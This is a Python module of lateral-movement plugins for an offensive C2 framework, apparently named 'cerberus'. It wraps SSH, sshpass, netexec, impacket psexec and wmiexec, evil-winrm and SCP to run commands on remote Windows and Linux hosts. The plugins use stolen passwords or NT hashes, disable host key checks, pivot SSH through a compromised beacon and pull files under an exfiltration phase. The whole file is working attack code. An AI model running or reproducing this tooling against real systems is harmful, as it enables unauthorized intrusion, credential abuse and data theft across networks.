"""Lateral movement wrappers — SSH, psexec, wmiexec, evil-winrm, netexec.

Uses operator-side tools when present; can also push SSH from a beacon.
"""

from __future__ import annotations

import asyncio
import shutil
from typing import Any

from cerberus.core.c2 import get_c2
from cerberus.core.phase import Phase
from cerberus.core.plugin_api import OpsecLevel, Plugin, PluginMeta, register_plugin

PHASES = [Phase.LATERAL, Phase.PRIVESC, Phase.EXFIL]


def _beacon_id(kwargs: dict, server) -> str | None:
    return kwargs.get("beacon") or kwargs.get("id") or (server.active_id if server else None)


@register_plugin
class LateralSshPlugin(Plugin):
    meta = PluginMeta(
        name="lateral_ssh",
        description="SSH to target with password/key and run a command (operator-side sshpass/ssh)",
        phase=PHASES,
        opsec=OpsecLevel.HIGH,
        requires=[],
        produces=["host"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        target = kwargs.get("target") or self.config.rhost
        user = kwargs.get("user") or "root"
        password = kwargs.get("password") or kwargs.get("pass")
        key = kwargs.get("key") or kwargs.get("identity")
        cmd = kwargs.get("cmd") or "id; hostname; uname -a"
        port = int(kwargs.get("port") or 22)
        if not target:
            return {"success": False, "message": "need target="}

        if key:
            ssh_cmd = [
                "ssh", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes",
                "-i", key, "-p", str(port), f"{user}@{target}", cmd,
            ]
        elif password and shutil.which("sshpass"):
            ssh_cmd = [
                "sshpass", "-p", password,
                "ssh", "-o", "StrictHostKeyChecking=no", "-p", str(port),
                f"{user}@{target}", cmd,
            ]
        else:
            # try keyless / agent
            ssh_cmd = [
                "ssh", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes",
                "-p", str(port), f"{user}@{target}", cmd,
            ]

        proc = await asyncio.create_subprocess_exec(
            *ssh_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()
        out = stdout.decode(errors="ignore")
        err = stderr.decode(errors="ignore")
        ok = proc.returncode == 0
        if ok:
            self.evidence.add(
                kind="host",
                target=target,
                data={"lateral": "ssh", "user": user, "output": out[:500]},
                source="lateral_ssh",
                plugin="lateral_ssh",
                confidence=0.9,
                tags=["lateral", "ssh"],
            )
        return {
            "success": ok,
            "message": f"ssh {user}@{target}:{port} rc={proc.returncode}",
            "output": out[:4000],
            "error": err[:1000] if not ok else "",
        }


@register_plugin
class LateralSshFromBeaconPlugin(Plugin):
    meta = PluginMeta(
        name="lateral_ssh_beacon",
        description="Pivot SSH from an existing beacon to another host (cmd on remote)",
        phase=PHASES,
        opsec=OpsecLevel.HIGH,
        requires=[],
        produces=["host"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        server = get_c2()
        if not server:
            return {"success": False, "message": "C2 not running"}
        bid = _beacon_id(kwargs, server)
        if not bid:
            return {"success": False, "message": "need active beacon"}
        target = kwargs.get("target")
        user = kwargs.get("user") or "root"
        cmd = kwargs.get("cmd") or "id; hostname"
        password = kwargs.get("password")
        if not target:
            return {"success": False, "message": "need target="}

        if password:
            remote = (
                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
                f"{user}@{target} '{cmd}' 2>&1 || "
                f"ssh -o StrictHostKeyChecking=no {user}@{target} '{cmd}' 2>&1"
            )
        else:
            remote = f"ssh -o StrictHostKeyChecking=no -o BatchMode=yes {user}@{target} '{cmd}' 2>&1"

        ok = await server.task(bid, "shell", {"cmd": remote})
        return {
            "success": ok,
            "message": f"ssh pivot {bid} → {user}@{target} tasked (see c2_results)",
            "beacon": bid,
            "target": target,
        }


@register_plugin
class LateralPsexecPlugin(Plugin):
    meta = PluginMeta(
        name="lateral_psexec",
        description="impacket psexec.py / netexec smb exec against Windows target",
        phase=PHASES,
        opsec=OpsecLevel.DANGEROUS,
        requires=[],
        produces=["host"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        target = kwargs.get("target") or self.config.rhost
        user = kwargs.get("user")
        password = kwargs.get("password") or kwargs.get("pass")
        hash_ = kwargs.get("hash") or kwargs.get("nthash")
        domain = kwargs.get("domain") or self.config.domain or "."
        cmd = kwargs.get("cmd") or "whoami"
        if not target or not user:
            return {"success": False, "message": "need target= user= and password=/hash="}

        # Prefer netexec
        nxc = shutil.which("netexec") or shutil.which("nxc")
        if nxc:
            args = [nxc, "smb", target, "-u", user, "-x", cmd]
            if domain and domain != ".":
                args += ["-d", domain]
            if hash_:
                args += ["-H", hash_]
            elif password:
                args += ["-p", password]
            else:
                return {"success": False, "message": "need password= or hash="}
            proc = await asyncio.create_subprocess_exec(
                *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            text = stdout.decode(errors="ignore") + stderr.decode(errors="ignore")
            ok = "[+]" in text or proc.returncode == 0
            if ok:
                self.evidence.add(
                    kind="host",
                    target=target,
                    data={"lateral": "psexec/nxc", "user": user, "output": text[:500]},
                    source="lateral_psexec",
                    plugin="lateral_psexec",
                    confidence=0.85,
                    tags=["lateral", "windows"],
                )
            return {"success": ok, "message": f"nxc exec {target}", "output": text[:4000]}

        psexec = shutil.which("psexec.py") or shutil.which("impacket-psexec")
        if not psexec:
            return {"success": False, "message": "netexec and psexec.py not found"}

        if hash_:
            auth = f"{domain}/{user}@{target}"
            args = [psexec, "-hashes", f":{hash_}", auth, cmd]
        else:
            auth = f"{domain}/{user}:{password}@{target}"
            args = [psexec, auth, cmd]

        proc = await asyncio.create_subprocess_exec(
            *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        text = stdout.decode(errors="ignore") + stderr.decode(errors="ignore")
        return {
            "success": proc.returncode == 0,
            "message": f"psexec {target} rc={proc.returncode}",
            "output": text[:4000],
        }


@register_plugin
class LateralWmiPlugin(Plugin):
    meta = PluginMeta(
        name="lateral_wmi",
        description="impacket wmiexec.py against Windows target",
        phase=PHASES,
        opsec=OpsecLevel.DANGEROUS,
        requires=[],
        produces=["host"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        target = kwargs.get("target") or self.config.rhost
        user = kwargs.get("user")
        password = kwargs.get("password") or kwargs.get("pass")
        hash_ = kwargs.get("hash") or kwargs.get("nthash")
        domain = kwargs.get("domain") or self.config.domain or "."
        cmd = kwargs.get("cmd") or "whoami"
        if not target or not user:
            return {"success": False, "message": "need target= user= password=/hash="}

        wmi = shutil.which("wmiexec.py") or shutil.which("impacket-wmiexec")
        if not wmi:
            return {"success": False, "message": "wmiexec.py not found"}

        if hash_:
            args = [wmi, "-hashes", f":{hash_}", f"{domain}/{user}@{target}", cmd]
        else:
            args = [wmi, f"{domain}/{user}:{password}@{target}", cmd]

        proc = await asyncio.create_subprocess_exec(
            *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        text = stdout.decode(errors="ignore") + stderr.decode(errors="ignore")
        ok = proc.returncode == 0
        if ok:
            self.evidence.add(
                kind="host",
                target=target,
                data={"lateral": "wmi", "user": user, "output": text[:500]},
                source="lateral_wmi",
                plugin="lateral_wmi",
                confidence=0.85,
                tags=["lateral", "windows"],
            )
        return {"success": ok, "message": f"wmiexec {target}", "output": text[:4000]}


@register_plugin
class LateralWinrmPlugin(Plugin):
    meta = PluginMeta(
        name="lateral_winrm",
        description="evil-winrm shell command against Windows target",
        phase=PHASES,
        opsec=OpsecLevel.HIGH,
        requires=[],
        produces=["host"],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        target = kwargs.get("target") or self.config.rhost
        user = kwargs.get("user")
        password = kwargs.get("password") or kwargs.get("pass")
        cmd = kwargs.get("cmd") or "whoami"
        if not target or not user or not password:
            return {"success": False, "message": "need target= user= password="}

        ewr = shutil.which("evil-winrm")
        if not ewr:
            return {"success": False, "message": "evil-winrm not found"}

        # non-interactive: -c if supported, else script
        args = [ewr, "-i", target, "-u", user, "-p", password]
        # many versions don't have -c; use echo pipe
        proc = await asyncio.create_subprocess_exec(
            *args,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(
            proc.communicate(input=f"{cmd}\nexit\n".encode()),
            timeout=60,
        )
        text = stdout.decode(errors="ignore") + stderr.decode(errors="ignore")
        return {
            "success": proc.returncode == 0 or "whoami" in text.lower() or bool(text.strip()),
            "message": f"evil-winrm {target}",
            "output": text[:4000],
        }


@register_plugin
class LateralScpPlugin(Plugin):
    meta = PluginMeta(
        name="lateral_scp",
        description="SCP a file to/from target (direction=push|pull)",
        phase=PHASES,
        opsec=OpsecLevel.MEDIUM,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        target = kwargs.get("target") or self.config.rhost
        user = kwargs.get("user") or "root"
        password = kwargs.get("password")
        local = kwargs.get("local")
        remote = kwargs.get("remote")
        direction = kwargs.get("direction") or "push"
        if not target or not local or not remote:
            return {"success": False, "message": "need target= local= remote="}

        if direction == "pull":
            src, dst = f"{user}@{target}:{remote}", local
        else:
            src, dst = local, f"{user}@{target}:{remote}"

        if password and shutil.which("sshpass"):
            cmd = ["sshpass", "-p", password, "scp", "-o", "StrictHostKeyChecking=no", src, dst]
        else:
            cmd = ["scp", "-o", "StrictHostKeyChecking=no", src, dst]

        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        return {
            "success": proc.returncode == 0,
            "message": f"scp {direction} {src} → {dst} rc={proc.returncode}",
            "error": stderr.decode(errors="ignore")[:500],
        }
